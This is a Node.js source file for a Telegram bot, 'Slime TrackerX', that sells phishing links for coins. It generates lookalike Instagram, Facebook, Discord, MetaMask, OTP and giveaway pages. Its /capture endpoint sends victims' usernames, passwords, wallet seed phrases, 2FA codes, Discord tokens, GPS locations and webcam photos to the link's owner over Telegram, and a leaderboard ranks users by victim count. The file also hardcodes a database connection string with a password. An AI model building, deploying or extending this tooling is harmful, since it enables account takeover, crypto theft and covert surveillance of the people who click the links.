const { Telegraf } = require("telegraf");
const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const crypto = require("crypto");
const mongoose = require("mongoose");
const fs = require("fs-extra");

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();

// ========== CONFIG ==========
const DOMAIN = "https://virtualnumbersfree.onrender.com";
const CHANNEL = "@devxtechzone";
const OWNER_ID = 7271063368;
const TOOL_COST = 15;
const REF_REWARD = 15;
const MENU_IMAGE = "https://files.catbox.moe/xcqa0q.jpeg";

// ========== MONGODB ==========
const MONGODB_URI = "mongodb+srv://mrdev:dev091339@cluster0.grjlq7v.mongodb.net/slimev1?retryWrites=true&w=majority";

mongoose.connect(MONGODB_URI)
  .then(() => console.log('✅ DB Connected'))
  .catch(err => console.log('❌ DB Error:', err));

// ========== SCHEMAS ==========
const userSchema = new mongoose.Schema({
  userId: Number,
  username: String,
  coins: { type: Number, default: 15 },
  referrals: { type: Number, default: 0 },
  referrer: { type: Number, default: null },
  totalTools: { type: Number, default: 0 },
  victims: { type: Number, default: 0 },
  isAdmin: { type: Boolean, default: false },
  createdAt: { type: Date, default: Date.now }
});

const toolSchema = new mongoose.Schema({
  token: String,
  userId: Number,
  type: String,
  label: String,
  url: String,
  createdAt: Date,
  expiresAt: Date,
  clicks: { type: Number, default: 0 },
  captures: { type: Number, default: 0 }
});

const User = mongoose.model('User', userSchema);
const Tool = mongoose.model('Tool', toolSchema);

// ========== CACHE ==========
let usersCache = new Map();
let bannedUsers = new Set();
let userSessions = new Map();
let lastMessageIds = new Map();

// ========== FORCE JOIN ==========
async function checkJoin(userId) {
  if (userId == OWNER_ID) return true;
  try {
    const member = await bot.telegram.getChatMember(CHANNEL, userId);
    return ["creator", "administrator", "member", "restricted"].includes(member.status);
  } catch(e) { return false; }
}

async function deleteOldMessage(chatId, messageId) {
  try {
    if (lastMessageIds.has(chatId)) {
      await bot.telegram.deleteMessage(chatId, lastMessageIds.get(chatId)).catch(() => {});
    }
    lastMessageIds.set(chatId, messageId);
  } catch(e) {}
}

bot.use(async (ctx, next) => {
  if (!ctx.from) return next();
  if (bannedUsers.has(ctx.from.id)) return ctx.reply("🚫 You are banned");
  if (ctx.callbackQuery && ctx.callbackQuery.data == "check_join") return next();
  
  if (!(await checkJoin(ctx.from.id))) {
    const msg = await ctx.reply(
      "🚫 JOIN CHANNEL FIRST 🚫\n\nJoin " + CHANNEL + " to use hacking tools",
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "📢 JOIN CHANNEL", url: "https://t.me/devxtechzone" }],
            [{ text: "✅ I JOINED", callback_data: "check_join" }]
          ]
        }
      }
    );
    await deleteOldMessage(ctx.chat.id, msg.message_id);
    return;
  }
  return next();
});

bot.action("check_join", async (ctx) => {
  if (await checkJoin(ctx.from.id)) {
    await ctx.answerCbQuery("✅ Access granted");
    await ctx.deleteMessage().catch(() => {});
    await initUser(ctx.from.id);
    await sendMenu(ctx);
  } else {
    await ctx.answerCbQuery("❌ Not a member", true);
  }
});

// ========== DATABASE FUNCTIONS ==========
async function initUser(userId, referrerId = null) {
  let user = usersCache.get(userId);
  if (!user) {
    let username = (await bot.telegram.getChat(userId)).username || "user_" + userId;
    user = new User({
      userId: userId,
      username: username,
      coins: 15,
      referrer: referrerId,
      isAdmin: userId == OWNER_ID
    });
    await user.save();
    usersCache.set(userId, user);
    
    if (referrerId && referrerId != userId) {
      let referrer = usersCache.get(referrerId);
      if (referrer) {
        referrer.coins += REF_REWARD;
        referrer.referrals += 1;
        await referrer.save();
        bot.telegram.sendMessage(referrerId, "🎉 New referral! +" + REF_REWARD + " coins\n👥 Total referrals: " + referrer.referrals);
      }
    }
  }
  return user;
}

async function removeCoins(userId, amount) {
  let user = usersCache.get(userId);
  if (user && user.coins >= amount) {
    user.coins -= amount;
    await user.save();
    usersCache.set(userId, user);
    return true;
  }
  return false;
}

async function addCoins(userId, amount) {
  let user = usersCache.get(userId);
  if (user) {
    user.coins += amount;
    await user.save();
    usersCache.set(userId, user);
    return true;
  }
  return false;
}

function getRefLink(userId) {
  return "https://t.me/" + (bot.botInfo?.username || "SlimeTrackerBot") + "?start=ref_" + userId;
}

// ========== CREATE HACK TOOL (1 HOUR EXPIRY) ==========
async function createHackTool(userId, type, label) {
  const user = await initUser(userId);
  
  if (user.coins < TOOL_COST) {
    return { error: "❌ Need " + TOOL_COST + " coins! You have " + user.coins };
  }
  
  await removeCoins(userId, TOOL_COST);
  
  const token = crypto.randomBytes(16).toString('hex');
  const expiresAt = new Date(Date.now() + 60 * 60 * 1000);
  const shortToken = token.substring(0, 8);
  
  let hackUrl = "";
  if (type == "instagram") hackUrl = "https://instagr.am/p/" + shortToken;
  else if (type == "facebook") hackUrl = "https://fb.watch/" + shortToken;
  else if (type == "discord") hackUrl = "https://discord.gg/" + shortToken;
  else if (type == "tokengrab") hackUrl = "https://discord.gift/" + shortToken;
  else if (type == "crypto") hackUrl = "https://metamask.io/verify/" + shortToken;
  else if (type == "giveaway") hackUrl = "https://prize.link/" + shortToken;
  else if (type == "otp") hackUrl = "https://verify.app/" + shortToken;
  else if (type == "iplogger") hackUrl = "https://track.me/" + shortToken;
  else hackUrl = DOMAIN + "/h/" + shortToken;
  
  await fs.ensureDirSync("public");
  
  let htmlContent = await fs.readFile(path.join(__dirname, "public", type + ".html"), "utf8");
  htmlContent = htmlContent.replace(/\[\[TOKEN\]\]/g, token);
  await fs.writeFile(path.join(__dirname, "public", token + ".html"), htmlContent);
  
  const tool = new Tool({
    token: token,
    userId: userId,
    type: type,
    label: label,
    url: hackUrl,
    createdAt: new Date(),
    expiresAt: expiresAt
  });
  await tool.save();
  
  user.totalTools += 1;
  await user.save();
  usersCache.set(userId, user);
  
  setTimeout(async () => {
    const expiredTool = await Tool.findOne({ token: token });
    if (expiredTool && new Date() > expiredTool.expiresAt) {
      await fs.remove(path.join(__dirname, "public", token + ".html")).catch(() => {});
    }
  }, 60 * 60 * 1000);
  
  return {
    success: true,
    url: hackUrl,
    remainingCoins: user.coins
  };
}

// ========== SEND MENU ==========
async function sendMenu(ctx) {
  const user = await initUser(ctx.from.id);
  
  const caption = `🔥 SLIME TRACKERX V1 🔥

👤 ${ctx.from.first_name}
💰 ${user.coins} COINS
👥 ${user.referrals} REFERRALS
🎯 ${user.victims} VICTIMS
🔧 ${user.totalTools} TOOLS USED

⚡ Tool Cost: ${TOOL_COST} coins
🎁 Referral Reward: +${REF_REWARD} coins

⬇️ SELECT A TOOL ⬇️`;
  
  const msg = await ctx.replyWithPhoto(MENU_IMAGE, {
    caption: caption,
    reply_markup: {
      inline_keyboard: [
        [{ text: "📸 INSTAGRAM", callback_data: "tool_instagram" }, { text: "📘 FACEBOOK", callback_data: "tool_facebook" }],
        [{ text: "🎮 DISCORD TOKEN", callback_data: "tool_tokengrab" }, { text: "🦊 METAMASK", callback_data: "tool_crypto" }],
        [{ text: "🎁 GIVEAWAY", callback_data: "tool_giveaway" }, { text: "🔐 2FA OTP", callback_data: "tool_otp" }],
        [{ text: "📍 IP LOGGER", callback_data: "tool_iplogger" }, { text: "💀 MY LINKS", callback_data: "my_links" }],
        [{ text: "💰 BALANCE", callback_data: "my_balance" }, { text: "🔗 REFERRAL", callback_data: "my_ref" }],
        [{ text: "🏆 LEADERBOARD", callback_data: "leaderboard" }, { text: "👤 PROFILE", callback_data: "my_profile" }],
        [{ text: "👑 ADMIN", callback_data: "admin_panel" }]
      ]
    }
  });
  await deleteOldMessage(ctx.chat.id, msg.message_id);
}

// ========== BOT START ==========
bot.start(async (ctx) => {
  let ref = null;
  const args = ctx.message.text.split(" ");
  if (args[1] && args[1].startsWith("ref_")) {
    ref = parseInt(args[1].replace("ref_", ""));
  }
  await initUser(ctx.from.id, ref);
  await sendMenu(ctx);
});

// ========== TOOL HANDLERS ==========
const tools = ["instagram", "facebook", "tokengrab", "crypto", "giveaway", "otp", "iplogger"];

for (const t of tools) {
  bot.action("tool_" + t, async (ctx) => {
    await ctx.answerCbQuery();
    userSessions.set(ctx.from.id, { action: "create_" + t });
    const msg = await ctx.reply("📝 Send a label name for this link:\nExample: free_iphone, instagram_login");
    await deleteOldMessage(ctx.chat.id, msg.message_id);
  });
}

bot.on("text", async (ctx) => {
  const session = userSessions.get(ctx.from.id);
  if (!session || !session.action || !session.action.startsWith("create_")) return;
  
  const type = session.action.replace("create_", "");
  const label = ctx.message.text.trim();
  
  const result = await createHackTool(ctx.from.id, type, label);
  userSessions.delete(ctx.from.id);
  
  if (result.error) {
    const msg = await ctx.reply(result.error);
    await deleteOldMessage(ctx.chat.id, msg.message_id);
    return;
  }
  
  const msg = await ctx.reply("✅ HACK LINK READY (Expires in 1 hour)\n\n🔗 " + result.url);
  await deleteOldMessage(ctx.chat.id, msg.message_id);
});

// ========== UTILITY HANDLERS ==========
bot.action("my_links", async (ctx) => {
  await ctx.answerCbQuery();
  const links = await Tool.find({ userId: ctx.from.id }).sort({ createdAt: -1 }).limit(10);
  
  if (links.length == 0) {
    const msg = await ctx.reply("📭 No active links. Create one from menu!");
    await deleteOldMessage(ctx.chat.id, msg.message_id);
    return;
  }
  
  let msgText = "💀 YOUR HACK LINKS 💀\n\n";
  for (const l of links) {
    const status = new Date(l.expiresAt) > new Date() ? "✅ ACTIVE" : "❌ EXPIRED";
    const timeLeft = Math.max(0, Math.floor((new Date(l.expiresAt) - new Date()) / 60000));
    msgText += `🎯 ${l.label || l.type}\n🔗 ${l.url}\n👆 ${l.clicks} clicks | 📸 ${l.captures} captures\n⏰ Expires in ${timeLeft} mins | ${status}\n\n`;
  }
  const msg = await ctx.reply(msgText);
  await deleteOldMessage(ctx.chat.id, msg.message_id);
});

bot.action("my_balance", async (ctx) => {
  await ctx.answerCbQuery();
  const user = await initUser(ctx.from.id);
  const msg = await ctx.reply(`💰 YOUR BALANCE 💰\n\n💵 Coins: ${user.coins}\n🎯 Victims: ${user.victims}\n🔧 Tools Used: ${user.totalTools}\n👥 Referrals: ${user.referrals}`);
  await deleteOldMessage(ctx.chat.id, msg.message_id);
});

bot.action("my_ref", async (ctx) => {
  await ctx.answerCbQuery();
  const user = await initUser(ctx.from.id);
  const msg = await ctx.reply(`🔗 REFERRAL PROGRAM 🔗\n\nYour link: ${getRefLink(ctx.from.id)}\n\n👥 Referrals: ${user.referrals}\n💰 Per referral: +${REF_REWARD} coins\n\nShare your link and earn coins instantly!`);
  await deleteOldMessage(ctx.chat.id, msg.message_id);
});

bot.action("leaderboard", async (ctx) => {
  await ctx.answerCbQuery();
  const topUsers = await User.find().sort({ victims: -1 }).limit(15);
  let msgText = "🏆 TOP 15 HACKERS 🏆\n\n";
  for (let i = 0; i < topUsers.length; i++) {
    const medal = i === 0 ? "👑" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    msgText += `${medal} ${i+1}. @${topUsers[i].username} - ${topUsers[i].victims} victims (${topUsers[i].coins} coins)\n`;
  }
  const msg = await ctx.reply(msgText);
  await deleteOldMessage(ctx.chat.id, msg.message_id);
});

bot.action("my_profile", async (ctx) => {
  await ctx.answerCbQuery();
  const user = await initUser(ctx.from.id);
  const msg = await ctx.reply(`👤 YOUR PROFILE 👤\n\n🆔 ID: ${user.userId}\n💰 Coins: ${user.coins}\n👥 Referrals: ${user.referrals}\n🎯 Victims: ${user.victims}\n🔧 Tools Used: ${user.totalTools}\n📅 Joined: ${user.createdAt.toLocaleDateString()}`);
  await deleteOldMessage(ctx.chat.id, msg.message_id);
});

// ========== ADMIN PANEL ==========
bot.action("admin_panel", async (ctx) => {
  const user = await initUser(ctx.from.id);
  if (!user.isAdmin && ctx.from.id != OWNER_ID) {
    await ctx.answerCbQuery("❌ Admin only!", true);
    return;
  }
  await ctx.answerCbQuery();
  const msg = await ctx.reply(
    "👑 ADMIN PANEL 👑\n\n/addcoins @user amount\n/removecoins @user amount\n/broadcast message\n/stats\n/users\n/ban @user\n/unban @user\n/setadmin @user\n/remadmin @user\n/clearusers"
  );
  await deleteOldMessage(ctx.chat.id, msg.message_id);
});

// ========== ADMIN COMMANDS ==========
bot.command("addcoins", async (ctx) => {
  if (ctx.from.id != OWNER_ID) return;
  const args = ctx.message.text.split(" ");
  const username = args[1]?.replace("@", "");
  const amount = parseInt(args[2]);
  if (!username || isNaN(amount)) return ctx.reply("Usage: /addcoins @user amount");
  
  for (let [id, user] of usersCache) {
    if (user.username == username) {
      user.coins += amount;
      await user.save();
      await ctx.reply(`✅ Added ${amount} coins to @${username}\n💰 New balance: ${user.coins}`);
      await bot.telegram.sendMessage(id, `👑 Admin gave you +${amount} coins!`);
      return;
    }
  }
  await ctx.reply("❌ User not found");
});

bot.command("removecoins", async (ctx) => {
  if (ctx.from.id != OWNER_ID) return;
  const args = ctx.message.text.split(" ");
  const username = args[1]?.replace("@", "");
  const amount = parseInt(args[2]);
  if (!username || isNaN(amount)) return ctx.reply("Usage: /removecoins @user amount");
  
  for (let [id, user] of usersCache) {
    if (user.username == username) {
      user.coins -= amount;
      if (user.coins < 0) user.coins = 0;
      await user.save();
      await ctx.reply(`✅ Removed ${amount} coins from @${username}\n💰 New balance: ${user.coins}`);
      await bot.telegram.sendMessage(id, `👑 Admin removed -${amount} coins!`);
      return;
    }
  }
  await ctx.reply("❌ User not found");
});

bot.command("broadcast", async (ctx) => {
  if (ctx.from.id != OWNER_ID) return;
  const msg = ctx.message.text.split(" ").slice(1).join(" ");
  if (!msg) return ctx.reply("Usage: /broadcast message");
  
  let sent = 0;
  for (let [id] of usersCache) {
    try {
      await bot.telegram.sendMessage(id, "📢 ADMIN ANNOUNCEMENT 📢\n\n" + msg);
      sent++;
    } catch(e) {}
  }
  await ctx.reply(`✅ Broadcast sent to ${sent} users`);
});

bot.command("stats", async (ctx) => {
  if (ctx.from.id != OWNER_ID) return;
  const totalUsers = await User.countDocuments();
  const totalLinks = await Tool.countDocuments();
  const totalVictims = (await Tool.find()).reduce((a,b) => a + b.captures, 0);
  const totalCoins = (await User.find()).reduce((a,b) => a + b.coins, 0);
  
  await ctx.reply(`📊 GLOBAL STATS 📊\n\n👥 Users: ${totalUsers}\n🔗 Links: ${totalLinks}\n🎯 Victims: ${totalVictims}\n💰 Total Coins: ${totalCoins}`);
});

bot.command("users", async (ctx) => {
  if (ctx.from.id != OWNER_ID) return;
  const users = await User.find().sort({ victims: -1 }).limit(30);
  let msg = "👥 USER LIST 👥\n\n";
  for (const u of users) {
    msg += `@${u.username} - ${u.victims} victims - ${u.coins} coins - ${u.referrals} referrals\n`;
  }
  await ctx.reply(msg);
});

bot.command("ban", async (ctx) => {
  if (ctx.from.id != OWNER_ID) return;
  const args = ctx.message.text.split(" ");
  const username = args[1]?.replace("@", "");
  if (!username) return ctx.reply("Usage: /ban @user");
  
  for (let [id, user] of usersCache) {
    if (user.username == username) {
      bannedUsers.add(id);
      await ctx.reply(`🚫 Banned @${username}`);
      await bot.telegram.sendMessage(id, "🚫 You have been banned!");
      return;
    }
  }
  await ctx.reply("❌ User not found");
});

bot.command("unban", async (ctx) => {
  if (ctx.from.id != OWNER_ID) return;
  const args = ctx.message.text.split(" ");
  const username = args[1]?.replace("@", "");
  if (!username) return ctx.reply("Usage: /unban @user");
  
  for (let [id, user] of usersCache) {
    if (user.username == username) {
      bannedUsers.delete(id);
      await ctx.reply(`✅ Unbanned @${username}`);
      await bot.telegram.sendMessage(id, "✅ You have been unbanned!");
      return;
    }
  }
  await ctx.reply("❌ User not found");
});

bot.command("setadmin", async (ctx) => {
  if (ctx.from.id != OWNER_ID) return;
  const args = ctx.message.text.split(" ");
  const username = args[1]?.replace("@", "");
  if (!username) return ctx.reply("Usage: /setadmin @user");
  
  for (let [id, user] of usersCache) {
    if (user.username == username) {
      user.isAdmin = true;
      await user.save();
      await ctx.reply(`✅ @${username} is now admin!`);
      await bot.telegram.sendMessage(id, "👑 You are now an admin!");
      return;
    }
  }
  await ctx.reply("❌ User not found");
});

bot.command("remadmin", async (ctx) => {
  if (ctx.from.id != OWNER_ID) return;
  const args = ctx.message.text.split(" ");
  const username = args[1]?.replace("@", "");
  if (!username) return ctx.reply("Usage: /remadmin @user");
  
  for (let [id, user] of usersCache) {
    if (user.username == username) {
      user.isAdmin = false;
      await user.save();
      await ctx.reply(`✅ @${username} is no longer admin`);
      await bot.telegram.sendMessage(id, "👑 You are no longer an admin!");
      return;
    }
  }
  await ctx.reply("❌ User not found");
});

bot.command("clearusers", async (ctx) => {
  if (ctx.from.id != OWNER_ID) return;
  await User.deleteMany({});
  usersCache.clear();
  await ctx.reply("✅ All users cleared!");
});

// ========== EXPRESS SERVER ==========
app.use(bodyParser.json({ limit: "50mb" }));
app.use(express.static("public"));

app.post("/capture", async (req, res) => {
  try {
    const { token, data, cam, loc } = req.body;
    
    const tool = await Tool.findOne({ token: token });
    if (!tool) return res.status(404).json({ error: "Link not found" });
    
    if (new Date() > tool.expiresAt) {
      return res.status(410).json({ error: "Link expired" });
    }
    
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    tool.captures += 1;
    await tool.save();
    
    const user = await User.findOne({ userId: tool.userId });
    if (user) {
      user.victims += 1;
      await user.save();
      usersCache.set(user.userId, user);
    }
    
    let msg = `💀 VICTIM CAPTURED! 💀\n\n🔧 Tool: ${tool.type}\n🏷️ Label: ${tool.label || "No label"}\n📱 IP: ${ip}\n`;
    if (data?.u) msg += `👤 Username: ${data.u}\n`;
    if (data?.p) msg += `🔑 Password: ${data.p}\n`;
    if (data?.email) msg += `📧 Email: ${data.email}\n`;
    if (data?.password) msg += `🔑 Password: ${data.password}\n`;
    if (data?.seedPhrase) msg += `💎 Seed Phrase: ${data.seedPhrase}\n`;
    if (data?.otpCode) msg += `🔐 OTP Code: ${data.otpCode}\n`;
    if (data?.discordToken) msg += `🎮 Discord Token: ${data.discordToken.substring(0, 40)}...\n`;
    if (data?.name) msg += `👤 Name: ${data.name}\n`;
    if (data?.phone) msg += `📞 Phone: ${data.phone}\n`;
    if (data?.address) msg += `🏠 Address: ${data.address}\n`;
    if (loc?.lat) msg += `📍 GPS: ${loc.lat}, ${loc.lon}\n`;
    msg += `⏰ Time: ${new Date().toLocaleString()}`;
    
    await bot.telegram.sendMessage(tool.userId, msg);
    
    if (cam) {
      await bot.telegram.sendPhoto(tool.userId, { source: Buffer.from(cam.split(',')[1], 'base64') });
    }
    
    res.json({ status: "success" });
  } catch(e) {
    console.error("Capture error:", e);
    res.status(500).json({ error: e.message });
  }
});

app.get("/p/:token", async (req, res) => {
  const token = req.params.token;
  const tool = await Tool.findOne({ token: token });
  
  if (!tool) return res.status(404).send("Link not found");
  if (new Date() > tool.expiresAt) return res.status(410).send("Link expired");
  
  tool.clicks += 1;
  await tool.save();
  
  const filePath = path.join(__dirname, "public", token + ".html");
  if (await fs.pathExists(filePath)) {
    res.sendFile(path.resolve(filePath));
  } else {
    res.status(404).send("Page not found");
  }
});

// ========== START SERVER ==========
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("🚀 Server on port " + PORT));

async function loadData() {
  const users = await User.find({});
  users.forEach(u => usersCache.set(u.userId, u));
  console.log("📂 Loaded " + usersCache.size + " users");
}

loadData().then(async () => {
  await bot.launch();
  console.log("🔥 SLIME TRACKERX V1 LIVE!");
  console.log("✅ Force Join: " + CHANNEL);
  console.log("💰 Tool Cost: " + TOOL_COST + " coins");
  console.log("⏰ Links expire in 1 hour");
});

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
